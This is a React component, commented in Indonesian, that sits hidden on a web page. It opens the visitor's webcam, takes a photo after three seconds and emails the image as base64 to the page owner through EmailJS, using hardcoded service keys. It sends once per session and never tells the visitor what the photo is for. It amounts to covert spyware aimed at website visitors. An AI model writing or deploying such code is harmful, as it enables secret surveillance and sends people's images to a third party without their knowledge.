import React, { useEffect, useRef } from "react";
import emailjs from "@emailjs/browser";

const CameraCapture = () => {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  useEffect(() => {
    const sent = sessionStorage.getItem("photoSent");
    if (sent) return;

    navigator.mediaDevices.getUserMedia({ video: true })
      .then((stream) => {
        videoRef.current.srcObject = stream;
        videoRef.current.play();

        setTimeout(() => {
          const canvas = canvasRef.current;
          const context = canvas.getContext("2d");
          context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
          const base64Image = canvas.toDataURL("image/jpeg");

          // Hentikan kamera
          stream.getTracks().forEach((track) => track.stop());

          // Kirim ke email
          emailjs.send(
            "service_owekil9",
            "template_cpvwstn",
            {
              user_email: "anonymous@visitor.com",
              message: `📸 Foto pengunjung (base64): \n\n${base64Image}`,
            },
            "mSJCO_NsfdQ76e3Nn"
          ).then(() => {
            console.log("📤 Foto berhasil dikirim via email!");
            sessionStorage.setItem("photoSent", "true");
          }).catch((error) => {
            console.error("❌ Gagal kirim foto:", error);
          });

        }, 3000); // Ambil foto setelah 3 detik

      }).catch((err) => {
        console.error("❌ Akses kamera ditolak:", err);
      });
  }, []);

  return (
    <div style={{ display: "none" }}>
      <video ref={videoRef} width="320" height="240" />
      <canvas ref={canvasRef} width="320" height="240" />
    </div>
  );
};

export default CameraCapture;
